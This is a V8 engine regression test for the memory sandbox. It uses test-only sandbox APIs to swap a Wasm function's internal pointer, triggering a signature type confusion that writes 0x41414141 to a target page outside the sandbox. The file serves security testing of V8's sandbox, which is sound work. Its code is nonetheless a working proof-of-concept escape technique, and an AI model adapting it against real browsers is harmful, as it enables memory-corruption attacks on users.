// Copyright 2024 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing

d8.file.execute('test/mjsunit/wasm/wasm-module-builder.js');

const builder = new WasmModuleBuilder();

let $box = builder.addStruct([makeField(kWasmFuncRef, true)]);
let $struct = builder.addStruct([makeField(kWasmI32, true)]);

let $sig_i_l = builder.addType(kSig_i_l);
builder.addFunction("func0", makeSig([wasmRefType($struct)], [])).exportFunc().addBody([
  kExprLocalGet, 0,
  ...wasmI32Const(0x41414141),
  kGCPrefix, kExprStructSet, $struct, 0
]);
builder.addFunction("func1", $sig_i_l).exportFunc().addBody([
  kExprLocalGet, 0,
  kExprI32ConvertI64,
]);
builder.addFunction("get_func0", kSig_r_v).exportFunc().addBody([
  kExprRefFunc, 0,
  kGCPrefix, kExprStructNew, $box,
  kGCPrefix, kExprExternConvertAny,
]);
builder.addFunction("get_func1", kSig_r_v).exportFunc().addBody([
  kExprRefFunc, 1,
  kGCPrefix, kExprStructNew, $box,
  kGCPrefix, kExprExternConvertAny,
]);
builder.addFunction("boom", kSig_i_l).exportFunc().addBody([
  kExprLocalGet, 0,
  kExprRefFunc, 1,
  kExprCallRef, $sig_i_l,
])

let instance = builder.instantiate();

const kHeapObjectTag = 1;
const kStructField0Offset = 8;  // 0:map, 4:hash
const kWasmInternalFunctionOffset = 4;

let memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));

function getPtr(obj) {
  return Sandbox.getAddressOf(obj) + kHeapObjectTag;
}
function getField(obj, offset) {
  return memory.getUint32(obj + offset - kHeapObjectTag, true);
}
function setField(obj, offset, value) {
  memory.setUint32(obj + offset - kHeapObjectTag, value, true);
}

let target = BigInt(Sandbox.targetPage - (kStructField0Offset - kHeapObjectTag));

let f0_box = getPtr(instance.exports.get_func0());
let f0 = getField(f0_box, kStructField0Offset);
let f0_int = getField(f0, kWasmInternalFunctionOffset);

let f1_box = getPtr(instance.exports.get_func1());
let f1 = getField(f1_box, kStructField0Offset);

setField(f1, kWasmInternalFunctionOffset, f0_int);

instance.exports.boom(target);
